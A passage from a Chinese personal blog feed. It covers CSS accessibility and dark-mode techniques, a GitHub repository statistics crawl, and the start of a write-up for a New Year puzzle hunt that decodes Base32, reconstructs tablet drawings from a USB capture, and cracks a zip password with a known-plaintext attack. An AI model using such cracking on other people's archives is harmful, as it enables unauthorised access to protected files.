article {\r\n        font: 13pt Georgia, \"Nimbus Roman No9 L\", \"Songti SC\", \"Noto Serif CJK SC\", \"Source Han Serif SC\", \"Source Han Serif CN\", STSong, \"AR PL New Sung\", \"AR PL SungtiL GB\", NSimSun, SimSun, \"TW\\-Sung\", \"WenQuanYi Bitmap Song\", \"AR PL UMing CN\", \"AR PL UMing HK\", \"AR PL UMing TW\", \"AR PL UMing TW MBE\", PMingLiU, MingLiU, serif!important;\r\n    }\r\n\r\n    /*除部分元素外，禁止在元素内部分页*/\r\n    * {\r\n        page-break-inside: avoid;\r\n    }\r\n    article p, article a, #comments, article {\r\n        page-break-inside: auto;\r\n    }\r\n}</pre>\n<p>MDx 自 1.9.3 版本起已经包含了对文章页的打印样式优化。可以很容易地看出，优化后的样式在物理纸张上将更容易阅读。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\" alt=\"\" width=\"1345\" height=\"1602\" class=\"aligncenter size-full wp-image-1959\"></a>\n<h2>prefers-color-scheme</h2>\n<p><code>prefers-color-scheme</code> 是最近才被浏览器广泛支持的一个媒体查询，但它的功能却很强大：<strong>响应系统级黑暗模式。</strong>这样，我们可以在开启黑暗模式的系统中让网页具有更好的可读性。不过由于这个媒体查询直到最近才被广泛支持，因此大部分网站对此并没有进行适配。</p>\n<blockquote><p>一些适配这一特性的网站：少数派、微信公众平台（文章页）等。</p></blockquote>\n<p>通过像这样的媒体查询，我们可以在系统启用黑暗模式时让页面实时响应：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    body {\r\n        background-color: #212121;\r\n        color: rgba(255, 255, 255, .7);\r\n    }\r\n}</pre>\n<p><code>prefers-color-scheme</code> 一共有 3 个可能值：<code>no-preference</code>, <code>light</code> 和 <code>dark</code>。你也可以不像上面的例子那样默认使用亮色样式并在黑暗模式下启用黑暗样式，而可以反过来将黑暗样式作为默认，用亮色样式覆盖。在不支持的浏览器上将会显示默认样式（即媒体查询不会生效）。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<h2>prefers-reduced-motion</h2>\n<p>看名字就猜得出，<code>prefers-reduced-motion</code> 是和 <code>prefers-color-scheme</code> 师出同门的媒体查询。因此，和 <code>prefers-color-scheme</code> 一样，它也是在最近才获得了浏览器的广泛支持。它的作用也很强大：<strong>响应系统的“减弱动态效果”模式。</strong>这对某些不喜欢甚至无法接受动画的用户可能很有帮助。要知道，对有些用户来说这甚至是医疗上的必要。使用如下的媒体查询，我们可以在系统启用减弱动态效果模式时让页面实时响应，减弱动画：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-reduced-motion: reduce) {\r\n    /*只是一个示例，实际情况中可以保留一些淡入淡出效果*/\r\n    * {\r\n        transition: all 0s!important;\r\n        transform: none!important;\r\n    }\r\n}</pre>\n<p><code>prefers-reduced-motion</code> 只有 2 个可能值：<code>no-preference</code> 和 <code>reduce</code>，在不支持的浏览器上该媒体查询不会生效。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\" alt=\"\" width=\"792\" height=\"515\" class=\"aligncenter size-full wp-image-1962\"></a>\n<h1>黑暗模式适配</h1>\n<p>黑暗模式可不是简单地切换到黑底白字这么简单。<strong>单纯地使用黑底白字会导致页面元素之间对比度过高，文字刺眼，反而降低了页面的可访问性。</strong>我在下面总结了几条应用在了 MDx 中的黑暗模式优化规则和 Google 推荐的优化规则：</p>\n<p><strong>一是避免黑底白字。</strong>黑底白字看起来真的很难受，事实上，深灰和浅灰是黑暗模式最好的配色。比较下方例子里的两段文本，毫无疑问深灰色背景和浅灰色文字搭配的样式的可读性要比黑底白字高很多。（p.s. 有时候这条规则在白底黑字时也适用）</p>\n<p><strong>二是更改部分元素的亮度和对比度以增强可读性。</strong>你可能已经注意到了，下面优化的例子里标题文字的颜色改变了。很明显，未优化的黑暗模式中标题可读性不如优化的版本。在实际中，我们通常可以通过 CSS 滤镜来实现这一更改。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    h1 {\r\n        /*反相颜色后再将色相旋转 180 度，使亮度反相*/\r\n        filter: invert(1) hue-rotate(180deg);\r\n    }\r\n}</pre>\n<p><strong>三是避免让图片过亮。</strong>未经处理的图片通常会导致过高的对比度，降低可读性。在 MDx 中，我选择降低图片的亮度来避免图片刺眼，而 Google 的建议则是使图片灰度，不过这会影响图片的整体观感。无论是哪一种方案，都可以使用 CSS 滤镜来轻松实现。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    img { \r\n        /*MDx 方案*/\r\n        filter: brightness(.8);\r\n        /*Google 方案*/\r\n        filter: grayscale(.5);\r\n    }\r\n}</pre>\n<div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是未优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg\"></p>\n</div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是经过优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg\"></p>\n</div>\n</div>\n<h1>其他细节</h1>\n<p>还有一些细节，虽然简单，但不可或缺。我把一部分没有在上文提到的 MDx 中的细节列在了这里。</p>\n<p><strong>一是允许页面缩放。</strong>在开发响应式页面时，很多网站会在页面头部添加这样一个 <code>meta</code>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt;</pre>\n<p>这样的 <code>meta</code> 设定了页面的宽度，却也固定了页面的缩放比例，用户难以手动放大网页。<strong>这样的设置对一部分视力障碍用户非常不友好</strong>，以至于苹果决定在自家的浏览器上忽略禁止缩放的 <code>meta</code>。按照 Google 的推荐，如果你在 MDx 设置中启用了“允许页面缩放”，那么 MDx 会输出这样的 <code>meta</code> 标签，允许页面进行五倍以内的缩放：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=5\"&gt;</pre>\n<p><strong>尽管很多时候放大页面会导致页面结构被破坏，但这大大增强了页面的可访问性，利大于弊。</strong>因此，在 MDx 中，“允许页面缩放”是默认启用的。</p>\n<p><strong>二是在跨设备阅读时同步阅读记录。</strong>这属于 MDx 的“元老级”功能之一。注意到页面右上角的那个“在其他设备上继续阅读”的按钮了吗？如果你滚动页面后重新点击它，你会发现二维码发生变化了。通过在二维码中记录阅读进度，用户在扫描二维码切换设备阅读时，MDx 在新设备上会自动滚动到和原设备上一致的位置——好吧，目前基于百分比的算法在某些情况下可能不太准，但我已经设计了一个更复杂但更精确的阅读进度记录算法，之后就会更新到 MDx 中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\" alt=\"\" width=\"1000\" height=\"574\" class=\"aligncenter size-full wp-image-1976\"></a>\n<p><strong>三是避免 Web 字体阻塞渲染。</strong>如果你在页面中使用了 Web 字体，在字体加载完成之前，浏览器可能不会渲染任何文本，这就导致用户可能需要等待一段时间才能开始浏览网页。Google 推荐使用 <code>font-display: swap;</code> 来向浏览器指定网页的 Web 字体渲染策略。这一规则会提供一个比较短的等待周期，如果在这段时间内 Web 字体没有完成加载，那么浏览器会以 fallback 字体渲染文本。任意时刻一旦 Web 字体完成渲染，浏览器就会使用 Web 字体重新渲染文本。这在大多数情况下都能满足可访问性的需求。</p>\n<p><strong>四是确保 html 元素具有合适的 <code>lang</code> 属性。</strong>这一属性声明了页面的主要语言，浏览器可以据此调整渲染策略，或者触发自动翻译；屏幕阅读器也能更好地阅读网页。</p>\n<p><strong>五是确保页面主要内容在丢失/禁用了 Javascript 甚至 CSS 的情况下仍然可用。</strong>作为一个以内容为主的网站，MDx 在禁用了 Javascript 的情况下页面主要内容仍然可用。这不只是为了 SEO，更是为了保证页面的可访问性。的确，目前的情况下，如果开启了 Lazyload，MDx 在禁用 Javascript 的情况下图片的确无法显示，但我会在后续版本中尽可能的优化这一问题。</p>\n<h1>附录：媒体查询开发技巧</h1>\n<p>有的时候，光有 CSS 响应媒体查询还不够，我们可能需要在 Javascript 中实时响应媒体查询。用如下代码就可以很简单地响应媒体查询：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">let mql = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\r\nmql.addListener(handleMediaChange);\r\n\r\n//在添加监听后先调用一次，获得当前查询结果\r\nhandleMediaChange(mql);\r\n\r\nfunction handleMediaChange(mql){\r\n    if(mql.matches){\r\n        //查询匹配\r\n    }else{\r\n        //查询不匹配\r\n    }\r\n}</pre>\n<p>在开发上述媒体查询的过程中，我们需要频繁地切换系统的相应模式或者调出打印窗口。<strong>实际上，Chrome 提供了更简单的调试方法：</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1946\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\" alt=\"\" width=\"723\" height=\"681\"></a>\n<p>只要在这里更改模式，相关媒体查询就能实时生效。这不会影响其他标签页，在关闭开发者工具之后也会自动恢复系统设置。</p>\n","link":"https://flyhigher.top/develop/1912.html"},{"title":"MDx Blog 现已随 MDx 1.9.5 发布","date":"2020-01-22 17:54:11","description":"<p>随着 MDx 发布 1.9.5 更新，<a href=\"https://mdxblog.flyhigher.top/\" rel=\"noopener noreferrer\" target=\"_blank\">MDx Blog</a> 现已建立。我将会在 MDx Blog 中分享一些开发故事并发布 MDx 更新日志。</p>","link":"https://flyhigher.top/diary/1905.html"},{"title":"GitHub 2019 统计无垠版","date":"2020-01-12 13:02:00","description":"\n<h1>缘起</h1>\n<p>2019 年底，我突发奇想想要自己统计一番 GitHub 上存储库的一些信息。尽管 GitHub 有自己的<a href=\"https://octoverse.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">年度统计</a>，我还是想试着自己爬取一下，说不定能挖出什么有意思的信息，何况这是我第一次有机会处理比较大量的数据，也算是一种学习的过程吧。于是花了一下午写了个简单的爬虫（时间都花在增加 Rate Limit 上了...），然后扔在了两台服务器上开始跑（GitHub  API 真是好文明）。</p>\n<p>从 2019.11.21 3 时到 2020.1.12 24 时的 52 天 21 小时内，我的爬虫一共爬取了<strong>与 2,024,705 个用户有关<sup>*</sup>的 14,651,923 个公共存储库的基础信息</strong>，平均每秒爬取 3.2 个存储库。据 GitHub 的官方数据计算，我爬取了大约 15% 的存储库信息，但由于封禁库和私有库的数量未知，我暂时无法确定我爬取的存储库占公共库的比例。同时由于存储库数量较多，基本可以认为爬取到的样本在时间尺度上已经足够随机，可以通过统计得出一般结论。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\" alt=\"\" width=\"700\" height=\"606\" class=\"aligncenter size-full wp-image-1892\"></a>\n<p>爬到自己了，合影.jpg</p>\n<p>那么下面就来看看统计出来的一些结果吧。爬虫的技术细节和数据集下载放在文末。</p>\n<p>* 指这些用户拥有至少一个库</p>\n<h1>统计信息</h1>\n<p><strong>以下统计结果均基于已放于文末的数据集。</strong>由于爬虫爬取的时间跨度长，加上我并没有完整爬取 GitHub 所有存储库，因此我<strong>不能保证以下统计结果符合真实情况</strong>，各位可以下载数据集或自行爬取进行验证。</p>\n<h2>一些数据</h2>\n<div>\n<div>\n<div>\n<span>3,120,930</span><br>总爬取用户数</div>\n<div>\n<span>44.7%</span><br>的存储库创建<br>自 Fork</div>\n<div>\n<span>6.59%</span><br>的账户被删除或<br>封禁<sup>1</sup>\n</div>\n<div>\n<span>23,913</span><br>单用户拥有最大<br>库数量<sup>2</sup>\n</div>\n</div>\n</div>\n<p><sup>1</sup> 基于用户 ID 规律合理推断<br><sup>2</sup> 统计范围仅限于当前数据集</p>\n<p>比较出乎我意料的是创建自 Fork 的存储库的占比。我预估这样的存储库占比不会太低，但没有想到能接近一半。此外单用户拥有最大库数量也大大超出了我的预期，<a href=\"https://github.com/pombredanne\" rel=\"noopener noreferrer\" target=\"_blank\">pombredanne</a> 这个用户名下拥有将近 24k 的存储库，不过绝大多数都是 Fork 来的，在情理之中。此外<strong>这个数据集中</strong>拥有最多存储库的账户其实是一个组织 <a href=\"https://github.com/gitpan\" rel=\"noopener noreferrer\" target=\"_blank\">gitpan</a>，这个组织拥有 36,377 个存储库。</p>\n<h2>语言</h2>\n<p><canvas></canvas><br>\n首先必须要说明的是，在这个榜单中我<strong>排除了 HTML 和 CSS</strong>，因为在严格意义上它们不属于“编程语言”。如果把它们计算进来的话，分别有 640,368 个和 361,425 个存储库的主要语言分别是 HTML 和 CSS，这样在这份榜单中它们可以排到第 6 和 第 10 名。JavaScript 毫无疑问获得第一，第二名 Python 的热度则和 JavaScript 相差将近一半。<strong>此外还有 2,448,486 个存储库未能识别出语言，占比 16.7%。</strong>在上面的榜单之外，与机器学习和数据科学相关的语言还有 Jupyter Notebook 排名第 13，R 排名 20，Julia 排名 43。</p>\n<p>说实话这份排名和 GitHub 官方的排名<strong>差别很大</strong>，除了前三名，后面的基本都不太一样。我的排名统计结果完全基于 GitHub 对于存储库的主要语言识别，加上我的存储库数据不完整，和官方的数据不同是很正常的，可以做一个参考，但大概率还是官方排名更加准确。</p>\n<h2>许可证</h2>\n<p><canvas></canvas></p>\n<p>自 GitHub 推出许可证功能以来，拥有许可证的存储库比例升升降降，却始终没有超过一半。<strong>选择一个合适的许可证对项目的良好发展真的很有帮助</strong>，要了解如何选择合适的许可证，请参阅<a href=\"https://www.runoob.com/w3cnote/open-source-license.html\" rel=\"noopener noreferrer\" target=\"_blank\">这篇文章</a>。</p>\n<p><canvas></canvas></p>\n<p>对于拥有许可证的存储库，MIT<del> 麻省理工许可证 </del>总是占比最大的；第二则是 Apache-2.0 许可证。此外，WTFPL 许可证也挤入了前 15 名。</p>\n<h2>星标</h2>\n<p><canvas></canvas><br>\nStar 数量毫无疑问是一个存储库受欢迎程度的体现，而 Star 数高的项目基本上大家都了解过。<strong>截至爬取结束时间</strong>，GitHub 中 Star 数最多的库是 <a href=\"https://github.com/freeCodeCamp/freeCodeCamp\" rel=\"noopener noreferrer\" target=\"_blank\">freeCodeCamp</a> <del>非常完美的驼峰命名法</del>，其次则是著名项目 <a href=\"https://github.com/996icu/996.ICU\" rel=\"noopener noreferrer\" target=\"_blank\">996.ICU</a>。<a href=\"https://github.com/vuejs/vue\" rel=\"noopener noreferrer\" target=\"_blank\">Vue</a> 现在的 Star 数已经稳压 <a href=\"https://github.com/facebook/react\" rel=\"noopener noreferrer\" target=\"_blank\">React</a> 一头，Vue YES! 此外 <a href=\"https://github.com/sindresorhus/awesome\" rel=\"noopener noreferrer\" target=\"_blank\">awesome</a> 也挤进第七名。<br><canvas></canvas><br>\n由于 Star 需要时间积累，新项目的 Star 数量很可能是比不过老项目的，这就会导致有实力的新项目无法出现在榜单中。因此我还统计了日均 Star 数，试图通过日均 Star 数来反映项目受欢迎的程度。<strong>由于正热门的项目会比老牌热门项目有优势，这一项的统计范围是 2020-01-01 之前的所有存储库。</strong>996.ICU 和 freeCodeCamp 再次出现在前 10 名，而最近的热门项目 <a href=\"https://github.com/wenyan-lang/wenyan\" rel=\"noopener noreferrer\" target=\"_blank\">wenyan</a> 则飙升至第 2 名。此外还有 <a href=\"https://github.com/menzi11/BullshitGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">BullshitGenerator</a>，即最近热门的“狗屁不通文章生成器”和 <a href=\"https://github.com/evil-huawei/evil-huawei\" rel=\"noopener noreferrer\" target=\"_blank\">evil-huawei</a> 分列第 3 和第 5 名。<br><canvas></canvas><br>\n说实话这个曲线<strong>比我预估的陡多了。</strong>你可能已经注意到了，这个图表的横轴不是均匀缩放的，实际上曲线要比看起来陡很多。同时受爬取方式的影响，GitHub 中 Star 数较少的存储库数量远比我爬取到的多。也就是说，<strong>实际情况下曲线远比这个图表上的陡。</strong>拿点 Star 不容易啊。</p>\n<h2>名称</h2>\n<p><canvas></canvas><br>\n终于知道了原来存储库的名称是有长度限制的...尽管最长有 100 位，<strong>大部分人还是喜欢 8 位长的存储库名。</strong>此外 1 位长的名称也比我预估的要多一些。举几个存储库名称长度为 100 的例子吧。</p>\n<ul>\n<li>testing-something-elsetesting-something-elsetesting-something-elsetesting-something-elsetesting-some</li>\n<li>acts_as_validated_config_so_app_will_not_run_in_random_situation_and_qa_gays_will_not_cry_to_you_whe</li>\n<li>............................................________-....................................-.---......</li>\n<li>----------------------------------------------------------------------------------------------------</li>\n<li>nyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyan</li>\n</ul>\n<p>...创造力有够丰富的。</p>\n<p><canvas></canvas></p>\n<p>最近 GitHub 上有一种奇怪的风气，那就是建立 Awesome 合集<del>骗 Star</del>。看起来 Awesome 存储库满地都是，甚至还出现了关于 Awesome 的 Awesome 合集这种迷惑行为。于是我统计了一下，<del>还好，</del>占比<del>才</del> 0.5% 不到<del>，Awesomer 们任重而道远呐</del>。</p>\n<p><canvas></canvas></p>\n<p>尽管要在 github.io 上托管网站，存储库不一定要以 .github.io 结尾，但我还是统计了一下。拥有这类存储库的用户比我预想的要少一些，看来还有很多人没有完全发挥 GitHub 的完整实力啊<del>（比如我 Doge）</del>。同时<strong>这类存储库在所有存储库中占比 1.12%</strong>，看起来不多<del>，不过至少比 Awesome 多</del>。<br><canvas></canvas><br>\n看得出来 GitHub 对于用户名长度的限制是 1-40 位。用户名最短的 27 位占据了 <code>A-Z</code> 外加 <code>-</code> 的所有可能，而用户名最长的则是一个组织 <a href=\"https://github.com/UOIT-RESEARCH-database-information-group\" rel=\"noopener noreferrer\" target=\"_blank\">UOIT-RESEARCH-database-information-group</a>。不知道是巧合还是某种规律，<strong>最受欢迎的用户名长度和存储库名称长度一样，都是 8</strong>，有点意思。</p>\n<h2>创建时间</h2>\n<p><canvas></canvas><br>\n由于我并没有完整爬取所有存储库，我只能以相对值来统计每月新增存储库数量的变化趋势。<strong>在这个图表中，我将 2017-09 的数据设为了 100%。</strong>你一定一眼就能注意到 2017 年 6,7,8 月的“一柱擎天”。<del datetime=\"2020-02-05T09:18:30+00:00\">我第一次看到这个数据的时候的确愣了一下，不过就着这条新闻看就能明白为什么了：<strong>2017 年 6 月微软收购 GitHub。</strong></del></p>\n<blockquote><p>重新确认了一下，微软收购 GitHub 比这个高峰晚了一年，目前我对这个高峰没有什么很好的解释，如果你有什么思路的话欢迎评论。</p></blockquote>\n<p><strong>需要注意的是这张图表中我排除了 Fork 存储库</strong>，因为 Fork 存储库在 API 中的创建时间是原始存储库的时间，会影响整体趋势。此外，GitHub 中还有一个创建于 2007 年 10 月 29 日的存储库，那就是 <code>id: 1</code> 的...</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"mojombo\" data-mdxgithubp=\"grit\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/mojombo/grit\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>而它的创建者正是 GitHub 的创始人之一 Tom Preston-Werner。</p>\n<h1>一些有趣的结果</h1>\n<p>当初打算自己爬的目的之一就是想看看能不能挖出什么有意思的信息，结果真的有一些不挖不知道的信息。</p>\n<h2>奇怪的存储库</h2>\n<p>在爬取到的所有存储库中，<strong>有 3 个存储库是“无主”的</strong>，即它们的 owner 属性为空。这三个存储库的基本信息如下。</p>\n<div class=\"mdui-table-fluid mdui-table-hoverable\"><table class=\"mdui-table\">\n<thead><tr>\n<th>ID</th>\n<th>名称</th>\n<th>Forked</th>\n<th>Star</th>\n<th>语言</th>\n<th>许可证</th>\n<th>创建于</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>72385291</td>\n<td>vscode-redprl</td>\n<td>否</td>\n<td>10</td>\n<td>TypeScript</td>\n<td>apache-2.0</td>\n<td>2016-10-31 08:50:01</td>\n</tr>\n<tr>\n<td>181218346</td>\n<td>electron-sys</td>\n<td>否</td>\n<td>10</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-14 03:20:56</td>\n</tr>\n<tr>\n<td>181391880</td>\n<td>node-sys</td>\n<td>否</td>\n<td>6</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-15 09:33:08</td>\n</tr>\n</tbody>\n</table></div>\n<p><strong>更奇怪的是这三个存储库“无主”的情况还不一样。</strong>第一个存储库可以通过 <code>/repositories</code> 这个 GitHub API 找到， <a href=\"https://api.github.com/repositories?since=72385290\" target=\"_blank\" rel=\"noopener noreferrer\">这个链接</a>中的第一个存储库就是它；而其余两个存储库甚至无法在 <code>/repositories</code> API 中找到。不过就算能在 API 中找到第一个存储库，它的 <code>html_url</code>，即 <code>https://github.com//vscode-redprl</code> 仍然是不可访问的。这可能是 GitHub 早期的一个 Bug 导致的，不过我仍然对爬虫是如何找到这三个存储库的以及这些 Stars 是哪里来的感到好奇。</p>\n<h2>奇怪的用户名</h2>\n<p>在爬虫爬了一段时间以后，API 中突然开始出现大量的以 fdp 开头的 18 位乱码作为用户名的用户。这些用户拥有的存储库和 starred 的存储库都为 0，而他们的 <code>html_url</code> 为 404。以下是几个例子。</p>\n<ul>\n<li>fdpEpolGCEdQX4ZlRJ</li>\n<li>fdp8XaVrdtmDZnO5pR</li>\n<li>fdp8XRAGnwAOkTr2Ya</li>\n</ul>\n<p>由于我的爬虫并没有超过 Rate Limit，所以我排除了这是污染数据的可能。我怀疑这可能是某种 Bot 账户，于是一边更新爬虫过滤掉了这些用户，一边给 GitHub 支持发邮件问了具体情况。过了两天 GitHub 回复我说这些是<strong>被自动判为可疑进而被封禁的用户</strong>（原话是 they have been flagged by our automated measures for detecting suspicious behavior）。<del>想到我正在疯狂爬取 GitHub，突然害怕.webp</del></p>\n<p>行吧。</p>\n<h1>技术细节</h1>\n<p>爬虫使用 Python3 编写，数据库使用 MySQL。爬虫共使用了 4 个 API Token，在两台服务器上分布式爬取。爬取思路为：</p>\n<ol>\n<li>通过 <code>/users</code> API 遍历用户，每个请求最多获取 30 个用户信息</li>\n<li>循环 30 个用户，分别获取 <code>/users/&lt;user_name&gt;/starred</code> 和 <code>/users/&lt;user_name&gt;/repos</code> API 中的存储库信息，每个请求最多获取 100 个存储库信息，超过 100 个的分页获取</li>\n<li>提取存储库信息，插入数据库。对于已存在的存储库，更新数据</li>\n<li>获取下 30 个用户信息</li>\n</ol>\n<p>由于爬取过程中我多次调整了爬虫逻辑，爬虫爬取到的用户 ID 区间并非连续的，具体区间为1-839586, 14800001-14885493 及 28965251-31161101。</p>\n<h1>免责声明</h1>\n<p>本站会尽可能地提供准确信息，但本站不对此文章中信息的准确性和即时性及带来的任何影响负责。</p>\n<p>本站不代表 GitHub 官方，本文仅供学习之用，请不要将本文内容直接用于任何商业项目中。</p>\n<h1>数据集下载</h1>\n<p>导出的 SQL 文件大约为 1.38GB，全部放在了 GitHub 上（在危险的边缘试探.webp</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"github-analysis-2019\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/github-analysis-2019\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>此外我也提供了 MEGA 下载，链接<a href=\"https://mega.nz/#F!juxm3A6T!7Vwpzi82W1OFrqTLu1A1pQ\">在这里</a>。</p>\n","link":"https://flyhigher.top/develop/1564.html"},{"title":"Milkice 跨年红包解谜 Writeup 及无垠跨年红包解谜答案","date":"2020-01-02 04:29:19","description":"\n<blockquote><p><del>又到了水文章的时间呢</del></p></blockquote>\n<p>先说明一下，这篇文章原本不是在计划中的，而原来说好的「在路上的两篇」文章<del>绝对不会咕</del>。我自己的红包答案本来打算直接塞在年度总结里的，结果发现稍微有些长，再加上我还花了一些时间解了<a href=\"https://milkice.me/\">奶冰</a>的红包解谜游戏，就打算把两个解谜过程放在一起单独写一篇文章。<del>真是个水文章的好理由</del>（被打死</p>\n<h1>奶<del> 子 </del>冰的红包</h1>\n<p>奶冰的红包题目比我的难多了，所以让我们先从难的开始吧。首先看一下<a href=\"https://milkice.me/2019/12/31/2019-summary/\">题目</a>：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1524\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\" alt=\"\" width=\"746\" height=\"410\"></a>\n<p>入口是 <code>happy.2020.milkice.me</code>，扔到浏览器里面表示找不到 IP，那么大概率就是 DNS 的 TXT 记录了，查一下得到 <code>nb2hi4dthixs63ljnrvwsy3ffzwwkl3tivrvezluomxxg5dsmvqw2ltqmnqxa3th</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1525\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\" alt=\"\" width=\"896\" height=\"278\"></a>\n<p>第一眼没看出来是什么编码，直觉是 BaseXX 系列的编码，加上提示“不只有 Base64”，可以推断出是 Base32，转大写解码得到 <code>https://milkice.me/sEcRets/stream.pcapng</code>。是个 URL，下载得到一个 Wireshark 文件，打开一看是和某 USB 设备的通讯抓包。<del>不会做，不做了。</del></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1526\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\" alt=\"\" width=\"1500\" height=\"813\"></a>\n<p>奶冰提示我“Google 上搜得到”，结合第二条提示搜索“wacom pcapng”找到了<a href=\"https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/\">这篇文章</a>（<del>这™就是答案啊</del>）。看起来是一样的套路，即通过解析数据得到数位板上画的内容，于是按文章的思路筛选出数位板发给主机的数据，导出，然后再用 tshark 导出文本数据。本来我想直接用文章中的 POC 的，结果折腾半天因为源的蜜汁原因库没装上，于是按文章中给出的数据结构自己写了段代码，分别导出 X、Y 轴数据扔进 Excel 画散点图。（<del>别问我为什么用 Excel，因为我手边没有更好的工具了</del>）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1528\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\" alt=\"\" width=\"1280\" height=\"530\"></a>\n<p><span>翻车现场之一</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1539\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\" alt=\"\" width=\"1000\" height=\"286\"></a>\n<p><span>懵逼奶冰.webp</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1533\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\" alt=\"\" width=\"1500\" height=\"462\"></a>\n<p>看得出有手写文字，不过是上下颠倒的，翻转图片得 <code>https://milkice.me/2020/uso.zip</code>。是个 zip，下载打开一看，有密码。<del>不会解，不做了。</del> 第一反应是暴力解密码，但是暴力跑了 15 分钟还是没有跑出来。暴力太不优雅了，肯定不是正确思路，但奶冰什么都不肯说了。不过在这时我终于发现第一个红包口令码就藏在压缩包的注释中，Get。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1544\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\" alt=\"\" width=\"806\" height=\"593\"></a>\n<p>然而题还没解完，回去看提示，看到提供了 osu 谱面下载，于是打算不管怎么样先下载来看看。然而 osu 谱面下载要登录，只好又花了几分钟找到第三方站点，成功下载。这时候可以注意到 uso.zip 里有个同名文件（432314 Mike Greene - Bill Nye the Science Guy Theme Song (Chinese Intro).osz），可以联想到是明文攻击。好吧，上 ARCHPR，十秒解出。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1530\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\" alt=\"\" width=\"462\" height=\"643\"></a>\n<p><span>现场还原.jpg</span></p>\n<p>.osz 文件并不是明文，猜测是压缩包（和 .pptx 